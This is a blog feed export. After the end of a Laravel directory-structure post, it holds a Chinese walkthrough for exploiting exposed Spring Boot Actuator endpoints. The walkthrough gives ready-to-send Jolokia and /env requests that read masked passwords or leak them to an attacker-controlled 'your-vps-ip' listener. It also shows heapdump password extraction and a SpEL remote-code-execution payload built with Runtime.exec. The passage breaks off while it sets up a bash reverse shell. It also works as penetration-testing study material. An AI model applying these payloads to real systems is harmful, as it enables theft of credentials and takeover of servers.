<p><code>app</code>目录下包含多个子目录，如<code>Console</code>、<code>Http</code>、<code>Providers</code>等。<code>Console</code>和<code>Http</code>目录提供了进入应用核心的API，HTTP协议和CLI是和应用进行交互的两种机制，但实际上并不包含应用逻辑。换句话说，它们只是两个向应用发布命令的方式。<code>Console</code>目录包含了所有的Artisan命令，<code>Http</code>目录包含了控制器、中间件和请求等。</p>
<p>其他目录将会在你通过Artisan命令make生成相应类的时候生成到<code>app</code>目录下。例如，<code>app/Jobs</code>目录直到你执行 <code>make:job</code> 命令生成任务类时才会出现在<code>app</code>目录下。</p>
<blockquote>
<p>注意：<code>app</code>目录中的很多类都可以通过Artisan命令生成，要查看所有有效的命令，可以在终端中运行<code>php artisan list make</code>命令。</p>
</blockquote>
<p><strong>Console目录</strong></p>
<p><code>Console</code>目录包含应用所有自定义的Artisan命令，这些命令类可以使用<code>make:command</code>命令生成。该目录下还有console核心类，在这里可以注册自定义的Artisan命令以及定义调度任务。</p>
<p><strong>Events目录</strong></p>
<p>这个目录默认不存在，但是可以通过 <code>event:generate</code> 和 <code>make:event</code> 命令创建。该目录用于存放事件类。事件类用于告知应用其他部分某个事件发生并提供灵活的、解耦的处理机制。</p>
<p><strong>Exceptions目录</strong></p>
<p><code>Exceptions</code>目录包含应用的异常处理器，同时还是处理应用抛出的任何异常的好地方。如果你想要自定义异常如何记录异常或渲染，需要修改 Handler 类。</p>
<p><strong>Http目录</strong></p>
<p><code>Http</code> 目录包含了控制器、中间件以及表单请求等，几乎所有进入应用的请求处理都在这里进行。</p>
<p><strong>Jobs目录</strong></p>
<p>该目录默认不存在，可以通过执行 <code>make:job</code> 命令生成，<code>Jobs</code>目录用于存放队列任务，应用中的任务可以被队列化，也可以在当前请求生命周期内同步执行。同步执行的任务有时也被看作命令，因为它们实现了命令模式。</p>
<p><strong>Listeners目录</strong></p>
<p>这个目录默认不存在，可以通过执行 <code>event:generate</code> 和 <code>make:listener</code> 命令创建。<code>Listeners</code>目录包含处理事件的类（事件监听器），事件监听器接收一个事件并提供对该事件发生后的响应逻辑，例如，<code>UserRegistered</code>事件可以被<code>SendWelcomeEmail</code>监听器处理。</p>
<p><strong>Mail目录</strong></p>
<p>这个目录默认不存在，但是可以通过执行 <code>make:mail</code> 命令生成，<code>Mail</code>目录包含邮件发送类，邮件对象允许你在一个地方封装构建邮件所需的所有业务逻辑，然后使用 <code>Mail::send</code> 方法发送邮件。</p>
<p><strong>Notifications目录</strong></p>
<p>这个目录默认不存在，你可以通过执行 <code>make:notification</code> 命令创建， <code>Notifications</code> 目录包含应用发送的所有通知，比如事件发生通知。Laravel的通知功能将通知发送和通知驱动解耦，你可以通过邮件，也可以通过Slack、短信或者数据库发送通知。</p>
<p><strong>Policies目录</strong></p>
<p>这个目录默认不存在，你可以通过执行 <code>make:policy</code> 命令来创建， <code>Policies</code> 目录包含了所有的授权策略类，策略用于判断某个用户是否有权限去访问指定资源。更多详情，请查看授权文档。</p>
<p><strong>Providers目录</strong></p>
<p><code>Providers</code> 目录包含应用的所有服务提供者。服务提供者在启动应用过程中绑定服务到容器、注册事件以及执行其他任务以为即将到来的请求处理做准备。</p>
<p>在新安装的Laravel应用中，该目录已经包含了一些服务提供者，你可以按需添加自己的服务提供者到该目录。</p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>php</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-PHP框架 -指纹识别 -代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring-Boot-Actuator未授权访问利用实战利用</title>
    <url>/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Spring-Boot-Actuator未授权访问利用"><a href="#Spring-Boot-Actuator未授权访问利用" class="headerlink" title="Spring-Boot-Actuator未授权访问利用"></a><strong>Spring-Boot-Actuator未授权访问利用</strong></h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>Actuator是spring boot提供的用来对应用系统进行自省和监控的功能模块，借助于Actuator开发者可以很方便地对应用系统某些监控指标进行查看、统计等。如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息。Actuator配置不当会导致未授权访问获取网站相关配置甚至RCE</p>
<h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合</p>
<h3 id="组件版本相互依赖关系"><a href="#组件版本相互依赖关系" class="headerlink" title="组件版本相互依赖关系"></a>组件版本相互依赖关系</h3><img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210825221013561.png" class title="image-20210825221013561">



<h3 id="Spring-Cloud-与-Spring-Boot-版本之间的依赖关系"><a href="#Spring-Cloud-与-Spring-Boot-版本之间的依赖关系" class="headerlink" title="Spring Cloud 与 Spring Boot 版本之间的依赖关系"></a>Spring Cloud 与 Spring Boot 版本之间的依赖关系</h3><img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210825221109141.png" class title="image-20210825221109141">



<h3 id="Spring-Cloud-小版本号的后缀及含义"><a href="#Spring-Cloud-小版本号的后缀及含义" class="headerlink" title="Spring Cloud 小版本号的后缀及含义"></a>Spring Cloud 小版本号的后缀及含义</h3><img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210825221154274.png" class title="image-20210825221154274">



<p>[TOC]</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>环境准备：JDK 1.8 or later and Maven 3.2+</p>
<p>漏洞环境集合源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/18PSZvDxIRFwuNQBxo__4Ng </span><br><span class="line">提取码：jfzx </span><br></pre></td></tr></table></figure>



<p>下面是网盘中的资源包对应的命令执行漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">springboot-spel-rce包-------------------------------------命令执行2.1  </span><br><span class="line">springcloud-snakeyaml-rce包-------------------------------命令执行2.2</span><br><span class="line">actuator-testbed-master包---------------------------------命令执行2.3  2.4  2.5</span><br><span class="line">springboot-h2-database-rce包------------------------------命令执行2.6  2.8</span><br><span class="line">springboot-restart-rce包----------------------------------命令执行2.7  2.10 2.11 2.12</span><br><span class="line">springboot-mysql-jdbc-rce --------------------------------命令执行2.9</span><br><span class="line">maliciousRMIServer包包含RMI服务代码</span><br></pre></td></tr></table></figure>



<p>修改监听端口(不修改的话默认只能在搭建环境主机上访问)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">src/main/resources/application.properties server.address=0.0.0.0</span><br></pre></td></tr></table></figure>



<p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mvn install</span><br></pre></td></tr></table></figure>



<p>启动服务(安装完成后会在主目录下生成后target文件夹，执行里面的jar包启动服务)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ./target/xxxxxxxx.jar</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/a149799f8e8cf1d346efe3ee5649f3d1.png" class>



<p>访问http:<em>&#x2F;&#x2F;127.0.0.1:8090显示springboot欢迎页面</em></p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/733cfef5eb93509eee7b349f83def144.png" class>



<p>当访问错误页面时，会提示错误信息</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/b84c0336ffa31a1c60da33c76f379659.png" class>

<p>这里访问env就可以看到环境特性</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/0b00e02831d25ebd363910e0a85f6c16.png" class>

<p>访问health显示应用的健康状态</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/e506922f3ff848db66817588eb0afe41.png" class>



<h2 id="漏洞集合"><a href="#漏洞集合" class="headerlink" title="漏洞集合"></a>漏洞集合</h2><h3 id="1-信息泄露"><a href="#1-信息泄露" class="headerlink" title="1.信息泄露"></a>1.信息泄露</h3><h4 id="1-1-路由及接口调用详情泄露"><a href="#1-1-路由及接口调用详情泄露" class="headerlink" title="1.1.路由及接口调用详情泄露"></a>1.1.路由及接口调用详情泄露</h4><blockquote>
<p>开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等</p>
</blockquote>
<p>可以访问以下swagger相关路由进行验证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/v2/api-docs</span><br><span class="line">/swagger-ui.html</span><br><span class="line"></span><br><span class="line">/swagger</span><br><span class="line">/api-docs</span><br><span class="line">/api.html</span><br><span class="line">/swagger-ui</span><br><span class="line">/swagger/codes</span><br><span class="line">/api/index.html</span><br><span class="line">/api/v2/api-docs</span><br><span class="line">/v2/swagger.json</span><br><span class="line">/swagger-ui/html</span><br><span class="line">/distv2/index.html</span><br><span class="line">/swagger/index.html</span><br><span class="line">/sw/swagger-ui.html</span><br><span class="line">/api/swagger-ui.html</span><br><span class="line">/static/swagger.json</span><br><span class="line">/user/swagger-ui.html</span><br><span class="line">/swagger-ui/index.html</span><br><span class="line">/swagger-dubbo/api-docs</span><br><span class="line">/template/swagger-ui.html</span><br><span class="line">/swagger/static/index.html</span><br><span class="line">/dubbo-provider/distv2/index.html</span><br><span class="line">/spring-security-rest/api/swagger-ui.html</span><br><span class="line">/spring-security-oauth-resource/swagger-ui.html</span><br></pre></td></tr></table></figure>



<p><strong>一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞</strong>，但是以 “<strong>默认安全</strong>“ 来讲，不暴露出这些信息更加安全。</p>
<p>对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞</p>
<p><strong>还有一些内置的端点路由由于未设置actuator访问控制暴露</strong></p>
<p>所有端点皆可以在org.springframework.boot.actuate.endpoint中找到表达的含义</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/33a5ec86aaddffe377ab51095d2b50db.png" class>

<blockquote>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注：Spring1.x在url跟路径下进行注册，在2.x版本中移动到/actuator的路径下：</span><br><span class="line"></span><br><span class="line">Spring1.x与2.x在post请求方面也存在差异，</span><br><span class="line"></span><br><span class="line">1.x通过application/x-www-form-urlencoded 进行post请求，</span><br><span class="line"></span><br><span class="line">2.x通过传递json包请求的applistion/json</span><br></pre></td></tr></table></figure>
</blockquote>
<p>其中对寻找漏洞比较重要接口的有：</p>
<ul>
<li><p><code>/env</code>、<code>/actuator/env</code></p>
<p>GET 请求 <code>/env</code> 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；</p>
<p>同时有一定概率可以通过 POST 请求 <code>/env</code> 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。</p>
</li>
<li><p><code>/refresh</code>、<code>/actuator/refresh</code></p>
<p>POST 请求 <code>/env</code> 接口设置属性后，可同时配合 POST 请求 <code>/refresh</code> 接口刷新属性变量来触发相关 RCE 漏洞。</p>
</li>
<li><p><code>/restart</code>、<code>/actuator/restart</code></p>
<p>暴露出此接口的情况较少；可以配合 POST请求 <code>/env</code> 接口设置属性后，再 POST 请求 <code>/restart</code> 接口重启应用来触发相关 RCE 漏洞。</p>
</li>
<li><p><code>/jolokia</code>、<code>/actuator/jolokia</code></p>
<p>可以通过 <code>/jolokia/list</code> 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。</p>
</li>
<li><p><code>/trace</code>、<code>/actuator/httptrace</code></p>
<p>一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p>
</li>
</ul>
<blockquote>
<p>除了上面一些端点路由，还有程序员自定义的根路径</p>
<ul>
<li>&#x2F;manage、&#x2F;management、项目APP相关名称</li>
<li>修改内置端点名字(如有些时候&#x2F;env被程序员修改为&#x2F;appenv)</li>
</ul>
</blockquote>
<h4 id="1-2-端点路由泄露导致敏感信息泄露"><a href="#1-2-端点路由泄露导致敏感信息泄露" class="headerlink" title="1.2.端点路由泄露导致敏感信息泄露"></a>1.2.端点路由泄露导致敏感信息泄露</h4><p><strong>认证字段的获取以证明可影响其他用户</strong></p>
<blockquote>
<p>这个主要通过访问&#x2F;trace 路径获取用户认证字段信息，比如如下站点存在 actuator<br>配置不当漏洞，在其 trace 路径下，除了记录有基本的 HTTP 请求信息（时间戳、HTTP<br>头等），还有用户 token、cookie字段</p>
</blockquote>
<p>trace 路径：</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/d50c0dccc7f6b5f4a461764a2f7065b4.png" class>

<p>用户字段泄露:</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/561692caae82f0847bc116f9873e09d1.png" class>

<p>通过替换 token 字段可获取其他用户的信息</p>
<p><strong>数据库账户密码泄露</strong></p>
<p>由于 actuator 会监控站点 mysql、mangodb<br>之类的数据库服务，所以通过监控信息有时可以拿下 mysql、mangodb<br>数据库；这个主要通过&#x2F;env 路径获取这些服务的配置信息，比如如下站点存在 actuator<br>配置不当漏洞，通过其&#x2F;env 路径，可获得 mysql、mangodb 的用户名及密码：</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/db9fb7d5cba6a62bd56ea1cf07835469.png" class>

<p><strong>Gitlab源代码泄露</strong></p>
<p>这个一般是在&#x2F;health 路径，比如如下站点，访问其 health 路径可探测到站点 git<br>项目地址：</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/813b4e89bbaa2442f21e889e89be4d9c.png" class>

<p><strong>后台用户账号密码泄露</strong></p>
<p>这个一般是在&#x2F;heapdump 路径下，访问&#x2F;heapdump 路径，返回 GZip 压缩 hprof<br>堆转储文件。在 Android studio<br>打开，会泄露站点内存信息，很多时候会包含后台用户的账号密码，泄露账号密码</p>
<h4 id="1-3获取星号脱敏的密码明文"><a href="#1-3获取星号脱敏的密码明文" class="headerlink" title="1.3获取星号脱敏的密码明文"></a>1.3获取星号脱敏的密码明文</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><blockquote>
<p>访问 &#x2F;env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
</blockquote>
<h6 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h6><ul>
<li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li>
<li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）</li>
</ul>
<h6 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h6><p><strong>步骤一:确定属性名</strong></p>
<p>访问目标网站的&#x2F;env或&#x2F;actuator&#x2F;env端点接口，全局搜索星号(*************)，通过被星号遮掩的属性值找到想要的目标属性</p>
<p><strong>步骤二:jolokia 调用相关 Mbean</strong> </p>
<p>这里需要获取的属性名为security.user,password，直接发包可以在响应包中的value键值中看到</p>
<ul>
<li>调用 <code>org.springframework.boot</code> Mbean</li>
</ul>
<blockquote>
<p>实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法</p>
</blockquote>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>调用 <code>org.springframework.cloud.context.environment</code> Mbean</li>
</ul>
<blockquote>
<p>实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法</p>
</blockquote>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>调用其他 Mbean</li>
</ul>
<blockquote>
<p>目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。</p>
</blockquote>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><h6 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h6><ul>
<li>可以 GET 请求目标网站的 <code>/env</code> </li>
<li>可以 POST 请求目标网站的 <code>/env</code> </li>
<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标使用了 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖</li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
</ul>
<h6 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h6><p><strong>步骤一:确定属性名</strong></p>
<p>访问目标网站的&#x2F;env或&#x2F;actuator&#x2F;env端点接口，全局搜索星号(*************)，通过被星号遮掩的属性值找到想要的目标属性</p>
<p><strong>步骤二： 使用 nc 监听 HTTP 请求</strong></p>
<p>在自己控制的外网服务器上监听 80 端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 80</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：  触发对外 http 请求</strong></p>
<p><code>eureka.client.serviceUrl.defaultZone=http://value:$&#123;属性&#125;@your-vps-ip:port</code>  </p>
<p><code>属性</code>替换为想要获取的目标属性</p>
<p><code>your-vps-ip</code> 换成自己外网服务器的真实 ip 地址</p>
<p><code>port</code>为前面监听的端口</p>
<ul>
<li><code>eureka.client.serviceUrl.defaultZone</code> 方法（<strong>不适用于</strong>明文数据中有特殊 url 字符的情况）</li>
</ul>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://value:$&#123;属性&#125;@your-vps-ip:port</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://value:$&#123;属性&#125;@your-vps-ip:port&quot;&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li><code>spring.cloud.bootstrap.location</code> 方法（<strong>同时适用于</strong>明文数据中有特殊 url 字符的情况）</li>
</ul>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location=http://your-vps-ip:port/?=$&#123;属性&#125;</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip:port/?=$&#123;属性&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤四： 刷新配置</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>步骤五： 解码属性值</strong></p>
<p>正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 <code>Authorization</code> 头内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic dmFsdWU6MTIzNDU2</span><br></pre></td></tr></table></figure>

<p>将其中的 <code>dmFsdWU6MTIzNDU2</code>部分使用 base64 解码，即可获得类似明文值 <code>value:123456</code>，其中的 <code>123456</code> 即是目标星号 * 脱敏前的属性值明文。</p>
<h5 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h5><h6 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h6><ul>
<li>可正常 GET 请求目标 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口</li>
</ul>
<h6 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h6><p><strong>步骤一:确定属性名</strong></p>
<p>访问目标网站的&#x2F;env或&#x2F;actuator&#x2F;env端点接口，全局搜索星号(*************)，通过被星号遮掩的属性值找到想要的目标属性</p>
<p><strong>步骤二:下载 jvm heap 信息</strong></p>
<blockquote>
<p>下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G</p>
</blockquote>
<p><code>GET</code> 请求目标的 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口，下载应用实时的 JVM 堆信息</p>
<p><strong>步骤三:使用 MAT 获得 jvm heap 中的密码明文</strong></p>
<p>参考 <a href="https://landgrey.me/blog/16/">文章</a> 方法，使用 <a href="https://www.eclipse.org/mat/downloads.php">Eclipse Memory Analyzer</a> 工具的 <strong>OQL</strong> 语句 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>

<p>辅助用 “<strong>password</strong>“ 等关键词快速过滤分析，获得密码等相关敏感信息的明文。</p>
<h3 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h3><h4 id="2-1-whitelabel-error-page-SpEL-RCE"><a href="#2-1-whitelabel-error-page-SpEL-RCE" class="headerlink" title="2.1.whitelabel error page SpEL RCE"></a>2.1.whitelabel error page SpEL RCE</h4><h5 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</li>
<li>至少知道一个触发 springboot 默认错误页面的接口及参数名</li>
</ul>
<h5 id="利用方法-2"><a href="#利用方法-2" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一: 找到目标网站正常传参点</strong></p>
<p>比如发现访问  <code>/xxxx?id=xxx</code> ，页面会报状态码为 500 的默认错误页面</p>
<p><strong>步骤二: 确认漏洞点</strong></p>
<p>输入 <code>/xxxx?id=$&#123;运算表达式&#125;</code> (假设运算表达式为7x7)</p>
<p>如果发现报错页面将 7x7 的值 49 计算出来并显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。</p>
<p><strong>步骤三: 命令执行漏洞利用</strong></p>
<p>运行代码将执行的命令字符串转换成 <code>0x**</code> java 字节形式(只需将target变量修改为需要执行的命令即可)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&#x27;执行的命令&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> target:</span><br><span class="line">    result += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x)) + <span class="string">&quot;,&quot;</span></span><br><span class="line"><span class="built_in">print</span>(result.rstrip(<span class="string">&#x27;,&#x27;</span>))</span><br></pre></td></tr></table></figure>



<p>执行 <code>open -a Calculator</code> 命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//ip:port/article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&#123;0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72&#125;))&#125;</span></span><br></pre></td></tr></table></figure>



<h5 id="利用实例"><a href="#利用实例" class="headerlink" title="利用实例"></a>利用实例</h5><p>环境是上面的资源集合的springboot-spel-rce，环境搭建参照上方</p>
<p>在搭建过程中可能会出现启动jar包时提示没有主清单属性，需要在pom.xml文件中添加依赖完成(参照文章<a href="https://blog.csdn.net/weixin_44373935/article/details/90046451">点击这里</a>)</p>
<p>访问<a href="https://127.0.0.1:9091/article?id=$%7B7*7%7D">https://127.0.0.1:9091/article?id=${7*7}</a></p>
<p>可以看到错误页面中花括号里面的表达式已经计算出来啦，49。此处参数点可利用</p>
<img src="/2022/05/15/Spring-Boot-Actuator%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8/image-20210827133545079.png" class title="image-20210827133545079">

<p>下面将花括号里面的修改成需要执行的命令</p>
<p>首先要将命令字符串转换为java字节形式，利用上面的python脚本</p>
<p>这里执行的命令为bash反弹shell，先将其进行base64编码转换(<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">在线转换地址</a>)</p>
